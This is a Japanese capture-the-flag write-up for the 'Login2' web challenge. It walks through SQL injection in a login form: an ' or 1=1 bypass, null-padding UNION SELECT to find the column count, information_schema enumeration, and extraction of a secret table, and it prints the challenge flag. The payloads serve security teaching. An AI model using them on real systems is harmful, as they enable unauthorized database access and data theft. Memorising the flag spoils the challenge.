---
title: Login2
description: union select  によるSQLi
author: FullteaOfEEIC
genre: Web
solver: 21
point: 323
---

# Login 2

> 筑紫君が自分の会員制サイトを修正したんだって。でもどうやら何が問題だったのかわかっていないみたいですよ?
> 
> https://tsukuctf.sechack365.com/problems/login2
> 
> ※ この問題では/problems/login2以下のみを用います。 他の問題/problems/<name>などと混同しないよう注意してください。

Login 1 ~ 3がセットでSQL injectionの問題になっています。
Login2では、SQL injectionが可能な場所を見つけた後に、適切なInjectionによりデーターベース内の情報を探索することでflagを得ることができます。

まずUsernameに``` ' or 1=1 ; -- ```を指定すると、図のようなログイン画面![login2](./login2.png)が表示されます。どうやらここにSQLiができそうです。
```UNION SELECT``` で情報を抜くために、まずSELECT文のカラム数を特定します。
Usernameとして ```' union select null ; -- ```,  ```' union select null, null ; -- ```,  ```' union select null, null, null ; -- ```  ...とnullの数を増やしていくと、nullが2個のときにログインに成功します。
これにて攻撃の準備は完了です。ここからは、データベース内を探索していきます。

MySQL内のデータに関する情報は、```information_schema.columns```というテーブルに収納されています。まずは、ここの```table_name```というカラムを見るのが定石です。ということで、Usernameに

```
' UNION SELECT table_name, null FROM information_schema.columns; -- 
```
を入力してログインすると、```super_secret_table```というテーブルがあることがわかります。多分flagはここでしょう。
次に、カラム名を知るために、Usernameを

```
' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name = 'super_secret_table'; -- 
```
としてログインします。すると、idとsecretというカラムがあることがわかります。
最後に、

```
' UNION SELECT secret, null FROM super_secret_table; -- 
```

とすればflagがゲットできます。

```txt
TsukuCTF{50_muCh_GR3AT_Hacker_!ND3ED}
```